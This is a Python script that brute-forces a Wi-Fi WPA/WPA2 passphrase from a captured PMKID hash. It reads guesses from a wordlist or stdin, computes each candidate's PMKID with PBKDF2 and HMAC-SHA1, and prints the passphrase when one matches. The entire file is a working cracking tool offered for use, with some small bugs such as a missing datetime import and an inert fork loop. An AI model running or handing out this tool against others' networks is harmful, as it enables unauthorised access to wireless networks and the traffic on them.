#!/usr/bin/env python3
# -*- coding: utf-8 -

import sys
import os
import time

import hashlib
import hmac

import binascii
from pbkdf2 import PBKDF2



def get_time():
    return datetime.strftime(datetime.now(),'[%m-%d %H:%M:%S]')

def get_realtive_time():
    return "[{}]".format('%.2f'%(time.time() - start_time))



hash = sys.argv[1]

# reads the Wordlist from a file or stdin, all at once. Needs rework
wlist = sys.argv[2]
if wlist == "stdin":
    wlist = sys.stdin.read().splitlines()
else:
    with open(wlist, 'r') as file:
        wlist = file.read().splitlines()

threads = 1



hash = hash.split('*')

AP_MAC = hash[1].lower()
client_MAC = hash[2].lower()
ESSID = hash[3]



hash = hash[0].lower()

salt = ESSID
ESSID = binascii.unhexlify(ESSID).decode()

print("ESSID:      " + ESSID)
print("AP MAC:     " + AP_MAC.upper())
print("client MAC: " + client_MAC.upper())
print("hash:       " + hash)


hmac_msg = bytes("PMK Name", "utf-8") +\
            binascii.a2b_hex(AP_MAC) +\
            binascii.a2b_hex(client_MAC)

found_psk = None
start_time = time.time()




        
def brute(thread_num):
    try:
        print("[thread {}] kicked off".format(thread_num))
        wlist_part = wlist[int(thread_num/threads*len(wlist)):int((thread_num+1)/threads*len(wlist))]
        for guess in wlist_part:
            pmkid = hmac.new(PBKDF2(guess, ESSID, 4096).read(32),
                            hmac_msg, hashlib.sha1).hexdigest()[:32]
            if pmkid == hash:
                found_psk = guess
                print("Found:\n" + found_psk)
                print("time taken: {} s".format(get_realtive_time()))
                exit(0)
        print("thread {} exhausted".format(thread_num))
    except KeyboardInterrupt:
        print('\n[thread {}] Ended at "{}" ({} s)'.format(thread_num, guess, get_realtive_time()))
        sys.exit(0)
    
try:
    for thread_num in range(1, threads):
        newpid = os.fork()
        if newpid == 0:
            brute(thread_num)
    brute(0)
    
except KeyboardInterrupt:
    print("Aborting…")
    sys.exit(0)

print("Wordlist exhausted, PSK not found")
print("time taken: {} s".format(get_realtive_time()))
exit(0)
